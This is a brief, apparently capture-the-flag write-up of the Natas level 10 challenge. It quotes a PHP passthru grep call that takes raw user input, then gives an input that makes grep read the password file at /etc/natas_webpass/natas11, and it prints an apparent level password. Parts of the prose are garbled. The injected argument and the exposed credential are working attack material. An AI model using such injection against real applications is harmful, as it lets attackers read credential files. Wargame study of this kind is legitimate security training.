@@ -1,0 +1,10 @@
+looking at the `passthru("grep -i $key dictionary.txt")`  I wounder if could
+the place where the flag resides.
+
+in the input field
+
+```
+"" /etc/natas_webpass/natas11
+```
+
+/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
